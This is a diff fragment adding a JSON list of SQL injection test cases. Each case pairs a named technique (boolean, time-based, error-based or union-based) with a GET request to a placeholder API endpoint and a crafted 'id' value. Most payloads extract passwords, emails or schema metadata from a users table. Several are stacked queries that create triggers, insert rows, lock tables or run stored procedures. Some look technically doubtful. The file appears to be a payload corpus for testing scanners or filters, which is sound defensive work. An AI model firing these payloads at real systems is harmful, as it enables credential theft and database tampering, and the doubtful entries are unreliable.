+      "id": "1' AND CHAR_LENGTH((SELECT password FROM users WHERE id=1)) > 5--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy full-text search",
+    "description": "Time-based using heavy full-text search operations",
+    "method": "GET",
+    "endpoint": "/api/fulltext",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT MATCH(title, content) AGAINST ((SELECT password FROM users WHERE id=1)) FROM articles--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_AsTWKB",
+    "description": "Error-based using ST_AsTWKB function",
+    "method": "GET",
+    "endpoint": "/api/twkb",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_AsTWKB((SELECT GROUP_CONCAT(parameter_name) FROM information_schema.parameters))--"
+    }
+  },
+  {
+    "name": "Union with NULL-safe equal",
+    "description": "Union injection with NULL-safe equal operator",
+    "method": "GET",
+    "endpoint": "/api/nullssafe",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT username <=> NULL, password <=> NULL FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with OCTET_LENGTH",
+    "description": "Boolean injection using OCTET_LENGTH function",
+    "method": "GET",
+    "endpoint": "/api/octetlength",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND OCTET_LENGTH((SELECT password FROM users WHERE id=1)) = 32--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy spatial operations",
+    "description": "Time-based using heavy spatial calculations and operations",
+    "method": "GET",
+    "endpoint": "/api/spatial",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT ST_Distance_Sphere(point(1,1), point(2,2)) FROM information_schema.tables t1, information_schema.tables t2--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_AsX3D",
+    "description": "Error-based using ST_AsX3D function",
+    "method": "GET",
+    "endpoint": "/api/x3d",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_AsX3D((SELECT GROUP_CONCAT(trigger_name) FROM information_schema.triggers))--"
+    }
+  },
+  {
+    "name": "Union with DEFAULT",
+    "description": "Union injection with DEFAULT keyword",
+    "method": "GET",
+    "endpoint": "/api/default",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT DEFAULT(username), DEFAULT(password) FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with BIT_LENGTH",
+    "description": "Boolean injection using BIT_LENGTH function",
+    "method": "GET",
+    "endpoint": "/api/bitlength",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND BIT_LENGTH((SELECT password FROM users WHERE id=1)) = 256--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy statistical functions",
+    "description": "Time-based using heavy statistical calculations",
+    "method": "GET",
+    "endpoint": "/api/statistical",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT STDDEV_SAMP(column_id) FROM all_tab_columns--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_GeoHashFromPoint",
+    "description": "Error-based using ST_GeoHashFromPoint function",
+    "method": "GET",
+    "endpoint": "/api/geohashpoint",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_GeoHashFromPoint((SELECT GROUP_CONCAT(view_definition) FROM information_schema.views))--"
+    }
+  },
+  {
+    "name": "Union with VALUES",
+    "description": "Union injection with VALUES clause",
+    "method": "GET",
+    "endpoint": "/api/values",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION VALUES (1, 'test'), (2, 'test2')--"
+    }
+  },
+  {
+    "name": "Boolean with CHARACTER_LENGTH",
+    "description": "Boolean injection using CHARACTER_LENGTH function",
+    "method": "GET",
+    "endpoint": "/api/characterlength",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND CHARACTER_LENGTH((SELECT password FROM users WHERE id=1)) BETWEEN 8 AND 12--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy pattern matching",
+    "description": "Time-based using heavy regular expression pattern matching",
+    "method": "GET",
+    "endpoint": "/api/regexp",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; SELECT REGEXP_REPLACE((SELECT password FROM users WHERE id=1), '^.*$', 'test') FROM information_schema.tables--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_LineFromWKB",
+    "description": "Error-based using ST_LineFromWKB function",
+    "method": "GET",
+    "endpoint": "/api/linewkb",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_LineFromWKB((SELECT GROUP_CONCAT(check_clause) FROM information_schema.check_constraints))--"
+    }
+  },
+  {
+    "name": "Union with ROW",
+    "description": "Union injection with ROW constructor",
+    "method": "GET",
+    "endpoint": "/api/row",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT ROW(username, password) FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with POSITION",
+    "description": "Boolean injection using POSITION function",
+    "method": "GET",
+    "endpoint": "/api/position",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND POSITION('@' IN (SELECT email FROM users WHERE id=1)) > 0--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy cursor operations",
+    "description": "Time-based using heavy cursor operations and iterations",
+    "method": "GET",
+    "endpoint": "/api/cursor",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; DECLARE c CURSOR FOR SELECT * FROM information_schema.tables; OPEN c; FETCH c; CLOSE c;--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_PolyFromWKB",
+    "description": "Error-based using ST_PolyFromWKB function",
+    "method": "GET",
+    "endpoint": "/api/polywkb",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_PolyFromWKB((SELECT GROUP_CONCAT(constraint_name) FROM information_schema.table_constraints))--"
+    }
+  },
+  {
+    "name": "Union with MULTISET",
+    "description": "Union injection with MULTISET operator (Oracle)",
+    "method": "GET",
+    "endpoint": "/api/multiset",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT MULTISET(SELECT username FROM users), MULTISET(SELECT password FROM users) FROM dual--"
+    }
+  },
+  {
+    "name": "Boolean with INSTR",
+    "description": "Boolean injection using INSTR function",
+    "method": "GET",
+    "endpoint": "/api/instr",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND INSTR((SELECT email FROM users WHERE id=1), '@') > 0--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy transaction operations",
+    "description": "Time-based using heavy transaction locking operations",
+    "method": "GET",
+    "endpoint": "/api/transaction",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; BEGIN; LOCK TABLE users IN EXCLUSIVE MODE; SELECT pg_sleep(5); COMMIT;--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_MPointFromWKB",
+    "description": "Error-based using ST_MPointFromWKB function",
+    "method": "GET",
+    "endpoint": "/api/mpointwkb",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_MPointFromWKB((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns))--"
+    }
+  },
+  {
+    "name": "Union with TABLE",
+    "description": "Union injection with TABLE operator",
+    "method": "GET",
+    "endpoint": "/api/tableop",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION TABLE users--"
+    }
+  },
+  {
+    "name": "Boolean with LOCATE",
+    "description": "Boolean injection using LOCATE function",
+    "method": "GET",
+    "endpoint": "/api/locate",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND LOCATE('@', (SELECT email FROM users WHERE id=1)) > 0--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy index operations",
+    "description": "Time-based using heavy index creation and scanning",
+    "method": "GET",
+    "endpoint": "/api/index",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; CREATE INDEX tmp_idx ON information_schema.tables(table_name); DROP INDEX tmp_idx;--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_MLineFromWKB",
+    "description": "Error-based using ST_MLineFromWKB function",
+    "method": "GET",
+    "endpoint": "/api/mlinewkb",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_MLineFromWKB((SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables))--"
+    }
+  },
+  {
+    "name": "Union with ARRAY",
+    "description": "Union injection with ARRAY constructor",
+    "method": "GET",
+    "endpoint": "/api/array",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT ARRAY[username, password] FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with SUBSTRING_INDEX",
+    "description": "Boolean injection using SUBSTRING_INDEX function",
+    "method": "GET",
+    "endpoint": "/api/substringindex",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND SUBSTRING_INDEX((SELECT email FROM users WHERE id=1), '@', 1) = 'admin'--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy view operations",
+    "description": "Time-based using heavy view creation and querying",
+    "method": "GET",
+    "endpoint": "/api/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; CREATE VIEW tmp_view AS SELECT * FROM information_schema.tables; SELECT * FROM tmp_view; DROP VIEW tmp_view;--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_MPolyFromWKB",
+    "description": "Error-based using ST_MPolyFromWKB function",
+    "method": "GET",
+    "endpoint": "/api/mpolywkb",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_MPolyFromWKB((SELECT GROUP_CONCAT(collation_name) FROM information_schema.collations))--"
+    }
+  },
+  {
+    "name": "Union with JSON_ARRAY",
+    "description": "Union injection with JSON_ARRAY function",
+    "method": "GET",
+    "endpoint": "/api/jsonarray",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT JSON_ARRAY(username, password), NULL FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with ELT",
+    "description": "Boolean injection using ELT function",
+    "method": "GET",
+    "endpoint": "/api/elt",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ELT(1, (SELECT password FROM users WHERE id=1)) = 'secret'--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy temporary table operations",
+    "description": "Time-based using heavy temporary table creation and manipulation",
+    "method": "GET",
+    "endpoint": "/api/temptable",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; CREATE TEMPORARY TABLE tmp AS SELECT * FROM information_schema.tables; SELECT * FROM tmp; DROP TABLE tmp;--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_GeomCollFromWKB",
+    "description": "Error-based using ST_GeomCollFromWKB function",
+    "method": "GET",
+    "endpoint": "/api/geomcollwkb",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_GeomCollFromWKB((SELECT GROUP_CONCAT(character_set_name) FROM information_schema.character_sets))--"
+    }
+  },
+  {
+    "name": "Union with JSON_OBJECT",
+    "description": "Union injection with JSON_OBJECT function",
+    "method": "GET",
+    "endpoint": "/api/jsonobject",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' UNION SELECT JSON_OBJECT('username', username, 'password', password), NULL FROM users--"
+    }
+  },
+  {
+    "name": "Boolean with FIELD",
+    "description": "Boolean injection using FIELD function",
+    "method": "GET",
+    "endpoint": "/api/field",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND FIELD((SELECT password FROM users WHERE id=1), 'secret', 'password') > 0--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy stored procedure execution",
+    "description": "Time-based using heavy stored procedure execution",
+    "method": "GET",
+    "endpoint": "/api/storedproc",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; EXEC sp_MSforeachtable 'SELECT * FROM ?';--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_BdPolyFromWKB",
+    "description": "Error-based using ST_BdPolyFromWKB function",
+    "method": "GET",
+    "endpoint": "/api/bdpolywkb",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_BdPolyFromWKB((SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges))--"
+    }
+  },
+  {
+    "name": "Boolean with FIND_IN_SET",
+    "description": "Boolean injection using FIND_IN_SET function",
+    "method": "GET",
+    "endpoint": "/api/findinset",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND FIND_IN_SET((SELECT password FROM users WHERE id=1), 'secret,password,123456') > 0--"
+    }
+  },
+  {
+    "name": "Time-Based with heavy trigger execution",
+    "description": "Time-based using heavy trigger execution and recursion",
+    "method": "GET",
+    "endpoint": "/api/trigger",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1'; CREATE TRIGGER tmp_trigger AFTER INSERT ON users FOR EACH ROW BEGIN SELECT SLEEP(5); END; INSERT INTO users VALUES (999, 'test', 'test'); DROP TRIGGER tmp_trigger;--"
+    }
+  },
+  {
+    "name": "Error-Based with ST_BdMPolyFromWKB",
+    "description": "Error-based using ST_BdMPolyFromWKB function",
+    "method": "GET",
+    "endpoint": "/api/bdmpolywkb",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "id": "1' AND ST_BdMPolyFromWKB((SELECT GROUP_CONCAT(grantee) FROM information_schema.schema_privileges))--"
+    }
   }
+]
